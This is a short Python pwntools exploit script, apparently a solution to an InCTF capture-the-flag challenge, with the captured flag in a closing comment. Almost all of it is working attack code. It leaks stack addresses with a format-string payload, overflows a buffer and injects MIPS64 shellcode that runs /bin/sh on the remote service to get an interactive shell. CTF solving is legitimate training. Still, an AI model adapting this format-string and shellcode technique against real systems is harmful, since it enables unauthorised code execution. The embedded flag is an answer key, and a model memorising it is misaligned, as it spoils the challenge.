from pwn import *
context.endian = 'little'

if __name__=='__main__':
  #io = process('./run.sh')
  #io = process('./run_with_gdb.sh')
  io = remote('gc1.eng.run', 32037)

  io.sendlineafter(b'|\n+---------------------------------------+\n',b'A')
  io.sendlineafter(b'willing to offer !!\n',b'%p|'*100)
  io.recvuntil(b'set to \n\n')
  jump_addr = int(io.recvline().split(b'|')[0],0) + 0x430
  print(f'Stack jump addr: {hex(jump_addr)}')
  io.sendlineafter(b'ress 1 or else Press 0\n',b'1')
  io.sendlineafter(b'|\n+---------------------------------------+\n',b'C')
  shellcode = asm('''
    ld $a0, 24($sp)
    li $a1, 0
    li $a2, 0
    li $v0, 0x13c1
    syscall
  ''',arch='mips64')
  io.sendlineafter(b'to offer !!\n',
    b'A'*0x28 +\
    p64(jump_addr)  +\
    shellcode + b'\x00\x00\x00\x00' + p64(jump_addr+0x20)+\
    b'/bin/sh\0'
  )
  io.interactive()
  #InCTF{w3_sh4ll_not_b3_m0v3D_132244345}